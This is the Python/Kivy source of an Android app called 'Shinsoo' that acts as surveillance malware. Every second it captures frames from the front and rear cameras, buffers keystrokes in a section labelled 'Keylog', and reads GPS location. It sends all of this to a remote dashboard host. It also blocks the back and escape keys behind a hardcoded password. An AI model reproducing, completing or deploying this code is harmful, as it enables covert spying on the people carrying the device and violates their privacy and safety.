import os
os.environ['KIVY_NO_ENV_CONFIG'] = '1'
os.environ['KIVY_ORIENTATION'] = 'portrait'

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.popup import Popup
from kivy.uix.camera import Camera
from kivy.uix.scrollview import ScrollView
from kivy.graphics import Color, Rectangle, RoundedRectangle, Line
from kivy.clock import Clock
from kivy.metrics import dp
from kivy.utils import platform
from kivy.core.window import Window
from datetime import datetime
import threading, uuid, base64, io

KIOSK_PASSWORD = "gokhan"
DASHBOARD_URL  = "https://shinsoo.pythonanywhere.com"

C_BG    = (0.04, 0.04, 0.06, 1)
C_PANEL = (0.09, 0.09, 0.12, 1)
C_RED   = (0.85, 0.10, 0.10, 1)
C_REDD  = (0.45, 0.04, 0.04, 1)
C_TEXT  = (0.93, 0.93, 0.93, 1)
C_DIM   = (0.50, 0.50, 0.55, 1)
C_GREEN = (0.10, 0.82, 0.38, 1)
C_YEL   = (1.00, 0.78, 0.10, 1)
C_BORD  = (0.22, 0.04, 0.04, 1)

PERMS = {'Dosya':False,'Kamera':False,'Mikrofon':False,'Konum':False,'Internet':True}

def make_device_id():
    try:
        return "SHINSOO-" + hex(uuid.getnode())[2:].upper()[-6:]
    except Exception:
        return "SHINSOO-000001"

DEVICE_ID = make_device_id()


class Card(FloatLayout):
    def __init__(self, **kw):
        super().__init__(**kw)
        with self.canvas.before:
            Color(*C_PANEL)
            self._bg = RoundedRectangle(pos=self.pos, size=self.size, radius=[dp(7)])
            Color(*C_BORD)
            self._ln = Line(rounded_rectangle=(self.x,self.y,self.width,self.height,dp(7)),width=1.1)
        self.bind(pos=self._u, size=self._u)
    def _u(self,*_):
        self._bg.pos=self.pos; self._bg.size=self.size
        self._ln.rounded_rectangle=(self.x,self.y,self.width,self.height,dp(7))


class RBtn(Button):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.background_color=(0,0,0,0); self.color=C_TEXT
        self.font_size=dp(12); self.bold=True
        with self.canvas.before:
            Color(*C_REDD)
            self._bg=RoundedRectangle(pos=self.pos,size=self.size,radius=[dp(6)])
            Color(*C_RED)
            self._ln=Line(rounded_rectangle=(self.x,self.y,self.width,self.height,dp(6)),width=1.4)
        self.bind(pos=self._u, size=self._u)
    def _u(self,*_):
        self._bg.pos=self.pos; self._bg.size=self.size
        self._ln.rounded_rectangle=(self.x,self.y,self.width,self.height,dp(6))


class MainScreen(BoxLayout):

    def __init__(self, **kw):
        super().__init__(orientation='vertical', **kw)
        self._cam_front = None
        self._cam_back  = None
        self._sender    = None
        self._key_buf   = []
        self._build_ui()
        Clock.schedule_interval(self._tick, 1)
        Clock.schedule_interval(self._update_status, 2)
        Clock.schedule_interval(self._send_frames, 1)
        Clock.schedule_interval(self._flush_keys, 0.5)

    def _build_ui(self):
        with self.canvas.before:
            Color(*C_BG)
            self._bgrect = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=lambda *_: setattr(self._bgrect,'pos',self.pos),
                  size=lambda *_: setattr(self._bgrect,'size',self.size))
        self.add_widget(self._build_hdr())
        self.add_widget(self._build_perm_bar())
        self.add_widget(self._build_cams())
        self.add_widget(self._build_status_card())
        self.add_widget(self._build_log())
        self.add_widget(self._build_footer())

    def _build_hdr(self):
        box = BoxLayout(size_hint_y=None, height=dp(44), padding=[dp(10),0])
        with box.canvas.before:
            Color(*C_REDD)
            self._hbg = Rectangle(pos=box.pos, size=box.size)
        box.bind(pos=lambda *_: setattr(self._hbg,'pos',box.pos),
                 size=lambda *_: setattr(self._hbg,'size',box.size))
        lbl = Label(text='[b]SHINSOO[/b]', markup=True,
                    font_size=dp(16), color=C_TEXT, halign='left', valign='middle')
        lbl.bind(size=lbl.setter('text_size'))
        self.lbl_time = Label(text='--:--:--', font_size=dp(11), color=C_DIM,
                              size_hint_x=None, width=dp(72), halign='right')
        box.add_widget(lbl); box.add_widget(self.lbl_time)
        return box

    def _build_perm_bar(self):
        box = BoxLayout(size_hint_y=None, height=dp(34),
                        padding=[dp(8),dp(3)], spacing=dp(4))
        with box.canvas.before:
            Color(*C_PANEL)
            self._pbg = Rectangle(pos=box.pos, size=box.size)
        box.bind(pos=lambda *_: setattr(self._pbg,'pos',box.pos),
                 size=lambda *_: setattr(self._pbg,'size',box.size))
        self.perm_labels = {}
        for name in PERMS:
            col = BoxLayout(orientation='vertical', spacing=dp(1))
            dot = Label(text='●', font_size=dp(10),
                        color=C_GREEN if PERMS[name] else C_DIM)
            lbl = Label(text=name[:3], font_size=dp(7), color=C_DIM)
            col.add_widget(dot); col.add_widget(lbl)
            self.perm_labels[name] = dot
            box.add_widget(col)
        return box

    def _build_cams(self):
        # Üst: ön kamera, Alt: arka kamera
        box = BoxLayout(orientation='vertical', size_hint_y=0.42, spacing=dp(2),
                        padding=[dp(2),dp(2)])
        # Ön kamera
        self._front_box = BoxLayout()
        with self._front_box.canvas.before:
            Color(0,0,0,1)
            self._fbg = Rectangle(pos=self._front_box.pos, size=self._front_box.size)
        self._front_box.bind(
            pos=lambda *_: setattr(self._fbg,'pos',self._front_box.pos),
            size=lambda *_: setattr(self._fbg,'size',self._front_box.size))
        self._lbl_front = Label(text='[ÖN KAMERA]', font_size=dp(10), color=C_DIM)
        self._front_box.add_widget(self._lbl_front)
        # Arka kamera
        self._back_box = BoxLayout()
        with self._back_box.canvas.before:
            Color(0,0,0,1)
            self._bbg = Rectangle(pos=self._back_box.pos, size=self._back_box.size)
        self._back_box.bind(
            pos=lambda *_: setattr(self._bbg,'pos',self._back_box.pos),
            size=lambda *_: setattr(self._bbg,'size',self._back_box.size))
        self._lbl_back = Label(text='[ARKA KAMERA]', font_size=dp(10), color=C_DIM)
        self._back_box.add_widget(self._lbl_back)
        box.add_widget(self._front_box)
        box.add_widget(self._back_box)
        return box

    def _build_status_card(self):
        card = Card(size_hint_y=None, height=dp(46))
        grid = GridLayout(cols=4, padding=dp(6), spacing=dp(2))
        self._info = {}
        fields = [('ID', DEVICE_ID[:12]), ('NET','--'), ('PKT','0'), ('GPS','--')]
        for key,val in fields:
            grid.add_widget(Label(text=key+':', font_size=dp(8), color=C_DIM))
            lbl = Label(text=val, font_size=dp(8), color=C_TEXT)
            self._info[key] = lbl
            grid.add_widget(lbl)
        card.add_widget(grid)
        return card

    def _build_log(self):
        card = Card()
        box = BoxLayout(orientation='vertical', padding=dp(5), spacing=dp(2))
        box.add_widget(Label(text='[b]LOG[/b]', markup=True,
                             font_size=dp(9), color=C_RED,
                             size_hint_y=None, height=dp(16)))
        self.log_box = BoxLayout(orientation='vertical',
                                 size_hint_y=None, spacing=dp(1))
        self.log_box.bind(minimum_height=self.log_box.setter('height'))
        sv = ScrollView()
        sv.add_widget(self.log_box)
        box.add_widget(sv)
        card.add_widget(box)
        self._log('SYS', C_GREEN, 'Basladi - ' + DEVICE_ID)
        return card

    def _build_footer(self):
        box = BoxLayout(size_hint_y=None, height=dp(40),
                        spacing=dp(6), padding=[dp(6),dp(3)])
        b1 = RBtn(text='KILITLE')
        b1.bind(on_release=self._lock_popup)
        b2 = RBtn(text='KAMERALARI BASLAT')
        b2.bind(on_release=self._start_cams)
        box.add_widget(b1); box.add_widget(b2)
        return box

    # ── Kamera ───────────────────────────────────────────────────────────────

    def _start_cams(self, *_):
        self._start_front()
        self._start_back()

    def _start_front(self):
        if self._cam_front:
            return
        try:
            self._front_box.clear_widgets()
            self._cam_front = Camera(index=1, resolution=(240,180), play=True)
            self._front_box.add_widget(self._cam_front)
            self._log('CAM', C_GREEN, 'On kamera aktif')
        except Exception as e:
            try:
                self._front_box.clear_widgets()
                self._cam_front = Camera(index=0, resolution=(240,180), play=True)
                self._front_box.add_widget(self._cam_front)
                self._log('CAM', C_GREEN, 'On kamera (0) aktif')
            except Exception as e2:
                self._log('CAM', C_RED, 'On kamera hatasi: '+str(e2))

    def _start_back(self):
        if self._cam_back:
            return
        try:
            self._back_box.clear_widgets()
            self._cam_back = Camera(index=0, resolution=(240,180), play=True)
            self._back_box.add_widget(self._cam_back)
            self._log('CAM', C_GREEN, 'Arka kamera aktif')
        except Exception as e:
            self._log('CAM', C_RED, 'Arka kamera hatasi: '+str(e))

    def _get_frame(self, cam):
        if not cam or not cam.texture:
            return None
        try:
            tex = cam.texture
            buf = tex.pixels
            from PIL import Image as PILImage
            img = PILImage.frombytes('RGBA', (tex.width, tex.height), buf)
            img = img.convert('RGB')
            out = io.BytesIO()
            img.save(out, format='JPEG', quality=30)
            return base64.b64encode(out.getvalue()).decode('utf-8')
        except Exception:
            return None

    def _send_frames(self, dt):
        if not self._sender:
            return
        f = self._get_frame(self._cam_front)
        b = self._get_frame(self._cam_back)
        if f: self._sender.queue_front(f)
        if b: self._sender.queue_back(b)

    # ── Keylog ───────────────────────────────────────────────────────────────

    def add_key(self, key):
        self._key_buf.append(key)

    def _flush_keys(self, dt):
        if not self._key_buf or not self._sender:
            return
        text = ' '.join(self._key_buf)
        self._key_buf = []
        self._sender.queue_key(text)

    # ── Log ──────────────────────────────────────────────────────────────────

    def _log(self, tag, color, msg):
        ts  = datetime.now().strftime('%H:%M:%S')
        row = BoxLayout(size_hint_y=None, height=dp(14), spacing=dp(3))
        row.add_widget(Label(text='['+tag+']', font_size=dp(8),
                             color=color, size_hint_x=None, width=dp(32)))
        row.add_widget(Label(
            text='[color=#666666]'+ts+'[/color] '+msg,
            markup=True, font_size=dp(8), color=C_TEXT, halign='left'))
        self.log_box.add_widget(row)
        if len(self.log_box.children) > 25:
            self.log_box.remove_widget(self.log_box.children[-1])

    def update_perm(self, name, granted):
        PERMS[name] = granted
        if name in self.perm_labels:
            self.perm_labels[name].color = C_GREEN if granted else C_DIM
        self._log('IZN', C_GREEN if granted else C_DIM,
                  name+': '+('OK' if granted else 'RED'))
        if name == 'Kamera' and granted:
            Clock.schedule_once(self._start_cams, 1)

    def _tick(self, dt):
        self.lbl_time.text = datetime.now().strftime('%H:%M:%S')

    def _update_status(self, dt):
        if self._sender:
            self._info['NET'].text  = 'OK' if self._sender.is_connected else 'YOK'
            self._info['NET'].color = C_GREEN if self._sender.is_connected else C_RED
            self._info['PKT'].text  = str(self._sender.packet_count)
            loc = self._sender.last_loc
            if loc:
                self._info['GPS'].text = str(round(loc[0],3))+','+str(round(loc[1],3))

    def _lock_popup(self, *_):
        content = BoxLayout(orientation='vertical', padding=dp(12), spacing=dp(8))
        content.add_widget(Label(text='[b]SIFRE[/b]', markup=True,
                                 font_size=dp(13), color=C_TEXT, halign='center'))
        pwd = TextInput(hint_text='Sifre', password=True,
                        size_hint_y=None, height=dp(40),
                        font_size=dp(14), multiline=False,
                        background_color=C_PANEL, foreground_color=C_TEXT)
        content.add_widget(pwd)
        err = Label(text='', color=C_RED, font_size=dp(11),
                    size_hint_y=None, height=dp(16))
        content.add_widget(err)
        btn_row = BoxLayout(size_hint_y=None, height=dp(40), spacing=dp(6))
        popup = Popup(title='Dogrulama', title_color=C_RED,
                      content=content, size_hint=(0.85,None), height=dp(230),
                      background_color=C_PANEL, separator_color=C_RED)

        def try_exit(*_):
            if pwd.text == KIOSK_PASSWORD:
                popup.dismiss()
                Clock.schedule_once(lambda dt: App.get_running_app().stop(), 0.3)
            else:
                err.text='Hatali sifre!'; pwd.text=''

        b_ok = RBtn(text='ONAYLA')
        b_no = Button(text='IPTAL', background_color=C_PANEL, color=C_DIM)
        b_ok.bind(on_release=try_exit)
        b_no.bind(on_release=popup.dismiss)
        btn_row.add_widget(b_ok); btn_row.add_widget(b_no)
        content.add_widget(btn_row)
        popup.open()


# ── DataSender ────────────────────────────────────────────────────────────────

class DataSender:
    def __init__(self):
        self.is_connected = False
        self.packet_count = 0
        self.last_loc     = None
        self._stop        = threading.Event()
        self._front_q     = [None]
        self._back_q      = [None]
        self._key_q       = []
        self._lock        = threading.Lock()
        self._thread      = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        # GPS
        self._gps_thread  = threading.Thread(target=self._gps_loop, daemon=True)
        self._gps_thread.start()

    def queue_front(self, b64): self._front_q[0] = b64
    def queue_back(self, b64):  self._back_q[0]  = b64
    def queue_key(self, text):
        with self._lock:
            self._key_q.append(text)

    def stop(self): self._stop.set()

    def _gps_loop(self):
        if platform != 'android':
            return
        try:
            from plyer import gps
            def on_loc(**kw):
                lat = kw.get('lat')
                lon = kw.get('lon')
                if lat and lon:
                    self.last_loc = (lat, lon)
            gps.configure(on_location=on_loc)
            gps.start(minTime=3000, minDistance=0)
        except Exception:
            pass

    def _loop(self):
        try:
            import requests
        except Exception:
            return
        url = DASHBOARD_URL + '/upload_data/' + DEVICE_ID
        while not self._stop.is_set():
            try:
                payload = {
                    'log': 'Heartbeat ' + datetime.now().strftime('%H:%M:%S'),
                }
                # Kamera frame'leri
                f = self._front_q[0]
                b = self._back_q[0]
                if f: payload['frame_front'] = f; self._front_q[0] = None
                if b: payload['frame_back']  = b; self._back_q[0]  = None
                # Keylog
                with self._lock:
                    keys = list(self._key_q)
                    self._key_q.clear()
                for k in keys:
                    payload['keylog'] = k
                # Konum
                if self.last_loc:
                    payload['location'] = {
                        'lat': self.last_loc[0],
                        'lon': self.last_loc[1],
                    }
                r = requests.post(url, json=payload, timeout=5)
                self.is_connected = (r.status_code == 200)
                self.packet_count += 1
            except Exception:
                self.is_connected = False
            self._stop.wait(1)


# ── Ana Uygulama ──────────────────────────────────────────────────────────────

class ShinsooApp(App):
    title = 'Shinsoo'

    def build(self):
        Window.clearcolor = C_BG
        self.screen = MainScreen()
        self.sender = DataSender()
        self.screen._sender = self.sender
        return self.screen

    def on_start(self):
        if platform == 'android':
            self._set_portrait()
            self._request_perms()
        else:
            for name in PERMS:
                PERMS[name] = True
                self.screen.update_perm(name, True)
        try:
            from android import activity
            activity.bind(on_back_pressed=self._on_back)
        except Exception:
            pass
        Window.bind(on_keyboard=self._on_key)

    def _set_portrait(self):
        try:
            from jnius import autoclass
            AI = autoclass('android.content.pm.ActivityInfo')
            PA = autoclass('org.kivy.android.PythonActivity')
            PA.mActivity.setRequestedOrientation(AI.SCREEN_ORIENTATION_PORTRAIT)
        except Exception:
            pass

    def _request_perms(self):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
            ], self._after_storage)
        except Exception as e:
            self.screen._log('ERR', C_RED, str(e))

    def _after_storage(self, permissions, grants):
        for p,g in zip(permissions,grants):
            self.screen.update_perm('Dosya', g)
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.RECORD_AUDIO,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION,
            ], self._after_all)
        except Exception as e:
            self.screen._log('ERR', C_RED, str(e))

    def _after_all(self, permissions, grants):
        for p,g in zip(permissions,grants):
            if 'CAMERA' in p:
                self.screen.update_perm('Kamera', g)
            elif 'RECORD_AUDIO' in p:
                self.screen.update_perm('Mikrofon', g)
            elif 'LOCATION' in p:
                self.screen.update_perm('Konum', g)

    def on_stop(self):
        if self.sender: self.sender.stop()

    def _on_back(self, *_):
        self.screen._lock_popup(); return True

    def _on_key(self, window, key, *_):
        if key == 27:
            self.screen._lock_popup(); return True
        return False


if __name__ == '__main__':
    ShinsooApp().run()
